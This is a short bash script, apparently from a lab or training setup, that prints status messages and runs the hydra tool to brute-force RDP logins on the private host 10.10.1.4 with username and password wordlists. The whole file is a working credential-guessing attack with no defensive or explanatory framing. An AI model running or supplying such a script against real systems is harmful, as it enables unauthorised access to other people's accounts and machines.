#!/bin/bash
echo 'Running brute force attack...'
sleep 1
echo 'Brutforce executed'
echo 'Please wait, this may take a while...'
stdbuf -oL -eL hydra -t 4 -vV -f -I -L scripts/usernames.txt -P scripts/passwords.txt rdp://10.10.1.4
echo 'Done!'
